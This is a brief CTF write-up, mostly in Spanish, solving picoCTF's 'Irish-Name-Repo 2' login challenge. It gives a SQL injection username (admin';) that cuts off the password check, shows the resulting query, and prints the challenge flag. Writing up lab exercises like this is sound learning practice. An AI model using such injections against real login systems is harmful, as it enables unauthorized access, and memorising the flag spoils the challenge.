# Irish-Name-Repo 2

## Objetivos
`https://jupiter.challenges.picoctf.org/problem/52849/` ([link](https://jupiter.challenges.picoctf.org/problem/52849/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:52849


## Solución 
```bash
username: admin';
password: pass
SQL query: SELECT * FROM users WHERE name='admin';' AND password='pass'

# Logged in!

Your flag is: picoCTF{m0R3_SQL_plz_fa983901}
```


## Notas adicionales 
Escribi admin '; y de password utilice la palabra pass